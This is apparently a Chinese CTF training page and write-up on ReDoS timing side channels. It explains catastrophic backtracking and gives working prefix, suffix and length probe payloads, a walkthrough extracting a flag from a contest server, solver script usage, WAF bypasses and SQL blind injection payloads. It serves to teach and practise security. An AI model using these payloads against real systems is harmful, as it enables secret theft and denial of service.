# redos|ReDoS 与时间侧信道|⏱️
## [g-redos-basic] ReDoS 原理与炸弹构造——先懂"为什么慢"，再谈"怎么用慢"
### [redos-principle] ReDoS 原理与检测 | easy | ReDoS;侧信道;正则 | regex dos;catastrophic backtracking;灾难性回溯
> 正则引擎"试错回溯"遇到嵌套量词会指数爆炸，耗时差异本身就是可探测的信号
## 原理：回溯与灾难性回溯
正则引擎是贪婪的：`(a+)+b` 匹配一长串 a 时，引擎会先尽量多吃 a，再回头看是不是 b；不是就吐回一个重试。**嵌套量词**（`+` 套 `+`、`*` 套 `+`）产生"同一字符可分到不同组"的歧义，n 个字符有 2^(n-1) 种分组方式，全部试完 = 指数级耗时（30 字符≈5 亿次）。
```regex
(a+)+$      # 对 "aaa...X"（长 a 串 + 非 a 结尾）爆炸
(.+)+$      # 万能点号版：对任意内容爆炸（但能成功匹配时贪婪快速完成，需配失败点）
```
> [!info] ReDoS = Regular expression Denial of Service。网页卡死是攻击效果；CTF 里更常用它当**时间信号**。
## 检测：源码特征
- 用户输入被**直接拼进正则**：`preg_match('/'.$_GET['x'].'/', $FLAG)`、`re.search(f'{user}', data)`、`new RegExp(user)` 等
- **耗时被回显**：`echo microtime diff`、`Exec Time:`、`response time` 字段
- 匹配目标是秘密（flag），匹配结果不直接输出
## 识别一句话
> 你发"规则"，它拿你的规则去匹配秘密，然后只告诉你**花了多久**。这就是 ReDoS 时间侧信道题。
### [redos-bomb] 炸弹 payload 构造：三件套与 (?!) | medium | ReDoS;payload;PCRE | (?!) lookahead;必需字符预检
> 探测 payload = 前置检查 + 炸弹 + 失败点三件套；`(?!)` 是同时满足"必然失败"与"绕过预检"的最优失败点
## 三件套解剖
| 零件 | 作用 | 写法 |
|---|---|---|
| ① 前置检查 | 猜对了才放行进炸弹 | `^(?=猜的前缀)` / `(?=.*猜的后缀$)` / `(?=[\s\S]{n}$)` |
| ② 炸弹 BOMB | 嵌套量词制造回溯歧义 | `([\s\S]+)+` 万能；`((.+)+)+`、`(.+)+(.+)+` 更强 |
| ③ 失败点 FAIL | 必然失败，且无字面量 | `(?!)` 最优；`(*FAIL)`(PCRE2) 备选 |
```regex
^(?=猜的前缀)([\s\S]+)+(?!)   # 猜对 ≈3ms，猜错 ≈30µs
```
## 两个必踩的坑（实测）
1. **结尾放具体字符**（`(.+)+z`）：PCRE 有"必需字符预检"——先全串找 z，找不到直接判失败，信号消失。失败点必须无字面量。
2. **爆炸区依赖特定字符**（`(a+)+`）：flag 里没有连续 a 就不爆。必须用 `[\s\S]` 匹配一切。
> [!warn] 为什么用 `(?=前缀)` 而不是 `^前缀([\s\S]+)+`：断言是零宽的，断言完引擎还在开头，爆炸区覆盖**整个 flag**，信号强度与已猜长度无关。直接拼前缀，最后几位爆炸变小，测不出来。
## 变体实测对比
| 变体 | 命中 | 未命中 | 结论 |
|---|---|---|---|
| 原版 `(?!)` | 2.75ms | 58µs | ✅ 可用 |
| 叠层 `((.+)+)+` | 3.82ms | 55µs | ✅ 更强 |
| 双炸弹 `(.+)+(.+)+` | 3.16ms | 66µs | ✅ 可用 |
| 换失败点 `(*FAIL)` | 3.23ms | 53µs | ✅ 可用（偶发抖动） |
| 受限 `(a+)+z` | 55µs | 61µs | ❌ 无信号（z 不在 flag → 预检短路） |
## 换完必做：校准
拿一个**肯定对的**猜测 + 一个**肯定错的**猜测各测 3 次取中位数，**比值 ≥10 倍才准上全量提取**。
## [g-redos-play] 时间侧信道实战——探测器、脚本与完整流程
### [redos-oracle] 时间侧信道探测器（前缀/后缀/长度） | easy | 侧信道;盲注;oracle | timing oracle;time blind
> 三个探测器覆盖"提取字符"的全部需求，判定流程用"多次取样+确认"扛噪声
## 三个探测器
```regex
前缀探测器: ^(?=前缀)([\s\S]+)+(?!)        # 慢 ⟺ flag 以"前缀"开头
后缀探测器: ^(?=.*后缀$)([\s\S]+)+(?!)     # 慢 ⟺ flag 以"后缀"结尾
长度探测器: ^(?=[\s\S]{n}$)([\s\S]+)+(?!)   # 慢 ⟺ flag 正好 n 个字符
```
## 为什么前后夹击
前缀探测器从第 0 位往后挖，后缀探测器从第 43 位往前挖，中间碰头——两个 oracle 一样可靠，省一半时间。先测长度才知道两边各挖多少、何时该停。
## 判定流程（防误报）
1. 扫全部候选字符（约 90 个），每个测 2 次取**中位数**；
2. 取耗时最大的候选（正确字符远超阈值）；
3. 超过阈值（如 100µs）再单独测 2-3 次**确认**；
4. 确认仍慢才收下。确认不过则试下一个候选，**不要跳过**（跳过会漏位）。
> [!tip] 阈值经验：先跑 3-5 发看命中量级，阈值 ≈ 命中量级 ÷ 10。换服务器必须重校。
### [redos-case] 实战案例：NEFU 可控正则夺 flag | medium | CTF实战;writeup | nsilab;nefu redos
> 真题全流程：源码 → 踩坑 → 长度 44 → 前后夹击逐位提取 → 双向验证，flag 为 nsilab{...}
## 题目源码（核心）
```php
$FLAG = file_get_contents('/flag');          // 秘密
$startTime = microtime(true);
if (!empty($_GET['x'])) {
    preg_match('/'.$_GET['x'].'/', $FLAG, $matches);  // 输入裸拼正则
}
echo "Exec Time: ". (microtime(true) - $startTime);   // 只回显耗时
```
## 完整流程
1. **验证信号**：`?x=^.(.+)%2B(?!)` 慢（进炸弹），`?x=a` 快（普通匹配）→ 时间差成立；
2. **测长度**：`^(?=[\s\S]{n}$)([\s\S]+)+(?!)` 扫 n=1..60，只有 n=44 命中 → flag 44 字符；
3. **前缀提取**：`^(?=已知前缀+c)([\s\S]+)+(?!)` 从第 0 位往后；
4. **后缀提取**：`^(?=.*c+已知后缀$)([\s\S]+)+(?!)` 从第 43 位往前；
5. **拼接补位**：漏位时用前缀探测器补测缺口（曾因误报否决漏 1 位，43≠44）；
6. **双向验证**：前缀全长 + 后缀全长 + 长度三条件齐 → PASS。
## 结果
```
FLAG: nsilab{22f8fbd8-****-****-****-************}   # 新旧实例一致
verify prefix=31.4ms suffix=2.8ms  ** PASS **
```
> [!info] `nsilab` 是出题方网络安全与信息实验室缩写，flag 主体是 UUID 格式。先测长度、再测首字符，避免瞎猜前缀格式。
### [redos-script] 自动化提取脚本（solver.py 系） | easy | 脚本;自动化 | solver.py
> probe 单发计时 / solver 一键提取 / payload_test 校准，三件脚本按需用
## probe.py：单发计时器
```powershell
python probe.py "正则" [测几次] [URL]
python probe.py "^nsilab\{([\s\S]+)+(?!)" 3 http://contest.ctf.nefu.edu.cn:32064/
```
输出 `med=` 即耗时中位数，>10 倍差距=有信号。核心逻辑：requests 发请求 → re 抠出 `Exec Time` 数字 → 中位数抗噪声。
## solver.py：主武器（一键提 flag）
```powershell
python solver.py [URL]      # 全自动：长度→前后夹击→补位→双向验证，约10分钟
```
输出末尾 `** PASS **` = 验证通过。换 payload 改文件顶部 `BOMB`/`FAIL`/`THRESH` 三个变量。
## payload_test.py：换 payload 必做校准
```powershell
python payload_test.py [URL]
```
改文件里 `probes` 列表即可加测试组；每组输出 HIT/MISS 对比，比值 <10 弃用该变体。
> [!warn] 别全速并发打服务器：10 并发以内 + 请求间隔 20ms，防止被封 IP / 打崩题目。
## [g-redos-ext] 变种与举一反三——换题适配与泛化
### [redos-variant] 换题适配：引擎/回显/过滤 | medium | 变种;绕过;WAF | RE2;线性引擎
> 30 秒自检 4 问定生死；引擎、回显渠道、WAF 过滤决定换哪个零件
## 30 秒自检（全"是"才直接套脚本）
1. 源码有用正则匹配、秘密是目标/藏于模式？
2. 正则内容我能控制（裸拼接）？
3. 有耗时回显？
4. 引擎是回溯型（PHP PCRE / Python re / Node V8 / Java）？
## 引擎决定生死
| 引擎 | ReDoS 可用性 | 注意 |
|---|---|---|
| PHP PCRE | ✅ 最友好 | 有回溯上限(默认 100 万步)，命中稳定毫秒级 |
| Python re | ✅ | `(?!)` 合法；无上限，命中可能秒级，tries 调 1 + 短超时 |
| Node V8 | ⚠️ | 有保护机制，信号弱，实测才知 |
| Go RE2 / Rust regex | ❌ 死路 | 线性时间不回溯，换 bool oracle / 报错差异 |
## 回显渠道适配
| 回显 | 怎么办 |
|---|---|
| 服务器回显耗时 | 直接用，最稳 |
| 只能自测 RTT | 多取样(5-10 次)+加厚炸弹+放宽阈值 |
| 匹配成功/失败(bool) | 探测器改 `^(?=猜的).*` 看 true/false，更简单 |
| 回显匹配内容 | 直接 `(?<=前缀)(.)` 抓，不需时序 |
## WAF 过滤换零件
| 被拦 | 换法 |
|---|---|
| 拦 `?` | 失败点换 `(*FAIL)`；再不行用 `(a+)+z`（z 必须存在于 flag） |
| 拦 `(` | ReDoS 基本无解，换漏洞类型 |
| 拦 `^` | 用 `\A` 或改"包含"探测 `(?=.*K)` |
| 拦 `[\s\S]` | 换 `(.+)+`（flag 无换行时等价）或 `(\w+)+` |
## 决策树
拿到 Web 题 → 可控正则且秘密是匹配目标？→ 是 → 有耗时回显？→ 是 → ReDoS 时间侧信道（套本类模板）；否 → 有匹配结果回显？→ 是 → bool 内容 oracle；全否 → 按漏洞类型换技能树。
### [redos-extend] 泛化：时间盲注家族与骨架复用 | medium | 时间盲注;骨架 | time-based blind;布尔盲注
> solver 骨架（发请求→读信号→二选一→枚举）对一切"盲注"通用，只换探测器这一层
## 骨架两层
- **骨架**：probe 发请求读信号 → oracle 二选一 → 并发枚举 → 确认防误报 → 双向验证。所有盲注通用。
- **payload**：本类题专用（正则三件套）。换题只换这一层。
## 盲注家族对照
| 类型 | 信号来源 | 示例 payload |
|---|---|---|
| ReDoS 时间（本篇） | 正则回溯耗时 | `^(?=猜的)([\s\S]+)+(?!)` |
| SQL 时间盲注 | `SLEEP()` 延迟 | `' AND IF(ASCII(SUBSTR(flag,1,1))=102,SLEEP(1),0)-- ` |
| 布尔盲注 | 页面内容真/假 | `' AND SUBSTR(flag,1,1)='f'-- ` |
| 报错盲注 | 报错信息差异 | `' AND (SELECT 1/0 FROM flag WHERE ...)-- ` |
## 枚举逻辑完全一致
先探长度 → 逐字符二选一 → 前后夹击可加速 → 拿到结果先验证。solver 的并发扫描、中位数、确认、验证逻辑可直接移植，只改"探测器怎么构造"。
> [!tip] 练习路径：本题跑熟（手动 3 发 + solver 全自动）→ 改 payload 变体观察信号 → 找 CTFtime 标签 ReDoS/side-channel 历史题复现 → 把骨架移植到一道 SQL 时间盲注题。
